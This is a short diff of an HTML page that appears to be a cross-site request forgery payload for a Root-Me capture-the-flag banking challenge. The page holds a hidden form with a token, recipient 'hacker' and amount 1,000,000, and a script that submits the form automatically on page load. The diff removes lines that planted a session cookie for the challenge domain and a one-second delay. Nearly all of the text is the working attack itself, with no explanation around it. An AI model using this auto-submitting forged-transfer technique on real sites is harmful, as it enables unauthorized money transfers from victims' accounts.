@@ -2,7 +2,7 @@
    <div class="my-3">
          <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6dGFybmF1ZF9lbXBpcmU6MTAw">
          <label for="recipient" class="form-label">Recipient:</label>
-         <input type="text" class="form-control" name="recipient" placeholder="babbz" value="hacker3">
+         <input type="text" class="form-control" name="recipient" placeholder="babbz" value="hacker">
          <label for="amount" class="form-label">Amount:</label>
          <input type="number" class="form-control" name="amount" min="0" max="1000000" placeholder="1000" value="1000000">
    </div>
@@ -10,11 +10,5 @@
 </form>
 
 <script>
-   // Ajouter le cookie de session
-   document.cookie = "bankme2-session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.Z7kx7w.ryi7GRuLKMl2j-xLbRJioAVfJO4; path=/; domain=bankme-2.challenges.pro.root-me.org;";
-
-   // Attendre que le formulaire soit prêt et soumettre
-   setTimeout(function() {
-      document.getElementById('transfer-form').submit();
-   }, 1000); // Attendre 1 seconde pour être sûr que le cookie est pris en compte
+   document.getElementById('transfer-form').submit();
 </script>
